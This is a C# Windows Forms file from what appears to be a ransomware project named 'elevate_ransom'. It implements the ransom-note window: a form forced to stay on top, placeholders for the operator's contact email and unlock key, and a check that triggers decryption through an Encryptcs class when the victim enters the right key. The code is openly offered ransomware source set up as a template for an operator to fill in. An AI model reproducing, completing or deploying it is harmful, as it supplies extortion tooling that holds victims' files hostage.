using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace elevate_ransom
{
    public partial class Evelate_Note : Form
    {
        string Ur_Email = "Ur Email Here";
        string key = "Ur Key Here";
        public Evelate_Note()
        {
            InitializeComponent();
            TopMost = true;
        }

        private void Evelate_Note_Load(object sender, EventArgs e)
        {
            textBox2.Text = Ur_Email;
            this.Show();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(textBox3.Text.Contains(key))
            {
                MessageBox.Show("Right Key We Are Going To Decrypt","Right",MessageBoxButtons.OK,MessageBoxIcon.Information);
                Encryptcs.OFF_Encrypt();
            }
            else
            {
                MessageBox.Show("Wrong Key", "Wrong", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
